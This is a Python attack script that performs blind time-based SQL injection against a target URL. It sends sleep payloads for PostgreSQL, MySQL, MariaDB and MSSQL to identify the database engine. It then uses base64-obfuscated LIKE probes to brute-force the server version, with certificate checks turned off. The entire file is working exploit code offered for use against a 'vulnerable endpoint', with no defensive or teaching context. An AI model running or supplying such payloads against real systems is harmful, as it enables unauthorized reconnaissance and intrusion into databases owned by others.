import sys
import requests
import urllib3
import argparse
import base64
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

KNOWN_VERSIONS = {
    "PostgreSQL": {
        "16": ["16.0", "16.1"],
        "15": ["15.0", "15.1", "15.2", "15.3", "15.4"],
        "14": [f"14.{i}" for i in range(11)],
        "13": [f"13.{i}" for i in range(13)],
        "12": [f"12.{i}" for i in range(17)],
        "11": [f"11.{i}" for i in range(23)],
        "10": [f"10.{i}" for i in range(24)],
        "9": ["9.6", "9.5", "9.4", "9.3", "9.2", "9.1", "9.0"],
    },
    "MySQL": {
        "8": [f"8.0.{i}" for i in range(37)],
        "5": ["5.7", "5.6", "5.5", "5.1", "5.0"],
    },
    "MariaDB": {
        "10": [f"10.{x}.{y}" for x in range(12) for y in range(10)],
        "5": ["5.5"],
    },
    "MSSQL": {
        "16": ["16.0"],
        "15": ["15.0.2000.5", "15.0.4153.1"],
        "14": ["14.0.1000.169"],
        "13": ["13.0.5026.0"],
        "12": ["12.0.2000.8"],
        "11": ["11.0.7001.0"],
        "10": ["10.50.6000.34", "10.0.1600.22"],
    },
}


def detect_db_type(target, query_prefix, use_post, proxies):
    db_types = {
        "PostgreSQL": "SELECT pg_sleep(3)",
        "MySQL": "SELECT SLEEP(3)",
        "MariaDB": "SELECT SLEEP(3)",
        "MSSQL": "WAITFOR DELAY '00:00:03'"
    }

    for db, sleep_payload in db_types.items():
        if time_based_injection(target, query_prefix, sleep_payload, use_post, proxies):
            print(f"[+] Detected Database: {db}")
            return db

    print("[-] Unable to determine database type.")
    sys.exit(1)


def stacked_query_test(target, query_prefix, use_post, proxies, db_type):
    test_query = "SELECT 1; SELECT 2"
    return time_based_injection(target, query_prefix, f"{test_query}; SELECT SLEEP(1)", use_post, proxies)

def get_db_version(target, query_prefix, use_post, proxies, db_type):
    version_queries = {
        "PostgreSQL": "SELECT version()",
        "MySQL": "SELECT VERSION()",
        "MariaDB": "SELECT VERSION()",
        "MSSQL": "SELECT @@VERSION"
    }

    query = version_queries[db_type]
    stacked = stacked_query_test(target, query_prefix, use_post, proxies, db_type)

    if stacked:
        payload = f"{query};"
    else:
        payload = f"AND 1=CAST(({query}) AS INT);"

    response = send_request(target, query_prefix + ";" + payload, use_post, proxies)
    print("[+] Database Version Response:\n", response.text)

def encode_base64_literal(literal: str) -> str:
    return base64.b64encode(literal.encode()).decode()

def build_version_probe_query(db_type: str, major: str, minor: str = None) -> str:
    if minor:
        version_guess = f"{major}.{minor}%"
    else:
        version_guess = f"{major}%"

    encoded_version = encode_base64_literal(version_guess)

    if db_type == "PostgreSQL":
        query = (
            f"SELECT pg_sleep(5) "
            f"WHERE current_setting($$server_version$$) "
            f"LIKE convert_from(decode($${encoded_version}$$, $$base64$$), $$UTF8$$);"
        )
    elif db_type in ["MySQL", "MariaDB"]:
        query = (
            f"SELECT IF(VERSION() LIKE FROM_BASE64('{encoded_version}'), SLEEP(5), 0);"
        )
    elif db_type == "MSSQL":
        query = (
            f"IF(@@VERSION LIKE CAST(CAST('{encoded_version}' AS XML).value('.','VARCHAR(MAX)') AS VARCHAR), "
            f"WAITFOR DELAY '00:00:05');"
        )
    else:
        raise ValueError(f"Unsupported DB type: {db_type}")

    return query

def time_based_injection(target, query_prefix, query, use_post, proxies):
    query = query.replace(" ", "+")

    if use_post:
        data = f"{query_prefix};{query};"
        response = send_request(target, data, True, proxies)
    else:
        response = send_request(target, query_prefix + ";" + query + ";", False, proxies)
 
    elapsed = response.elapsed.total_seconds()
    print(elapsed)
    return elapsed >= 3

def send_request(target, full_query, use_post, proxies):
    proxies = proxies or {}

    if not target.endswith('?'):
        target += '?'  # Ensuring the target URL ends with ?

    if use_post:
        headers = {'Content-Type': 'application/octet-stream'}
        response = requests.post(target, data=full_query, headers=headers, verify=False, proxies=proxies)
    else:
        full_url = f"{target}{full_query}"
        response = requests.get(full_url, verify=False, proxies=proxies)

    return response

def enumerate_version_blind(target, query_prefix, use_post, proxies, db_type):
    print(f"[*] Starting version enumeration for {db_type}")

    major_version = None
    for major in ["8", "9", "10", "11", "12", "13", "14", "15", "16"]:
        query = build_version_probe_query(db_type, major)
        if time_based_injection(target, query_prefix, query, use_post, proxies):
            print(f"[+] Major version found: {major}")
            major_version = major
            break
    else:
        print("[-] Unable to determine major version")
        return

    minor_version = None
    for minor in range(0, 30):
        query = build_version_probe_query(db_type, major_version, str(minor))
        if time_based_injection(target, query_prefix, query, use_post, proxies):
            print(f"[+] Minor version found: {major_version}.{minor}")
            minor_version = minor
            break
    else:
        print("[-] Unable to determine minor version")
        return

    print(f"[+] Final detected version: {major_version}.{minor_version}")

def main():
    parser = argparse.ArgumentParser(description="Blind SQL Injection Version Enumerator")
    parser.add_argument("-t", "--target", required=True, help="Full URL to the vulnerable endpoint")
    parser.add_argument("-p", "--post", action="store_true", help="Use POST request (default GET)")
    parser.add_argument("-q", "--query", required=False, default="ForMasRange=1&userId=1", help="Query string prefix")
    parser.add_argument("--proxy", required=False, help="Proxy (http://127.0.0.1:8080)")
    #parser.add_argument("--db", required=True, choices=["PostgreSQL", "MySQL", "MariaDB", "MSSQL"], help="Target database type")

    args = parser.parse_args()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

     # Detect Database Type
    db_type = detect_db_type(args.target, args.query, args.post, proxies)

    enumerate_version_blind(args.target, args.query, args.post, proxies, db_type)

if __name__ == '__main__':
    main()
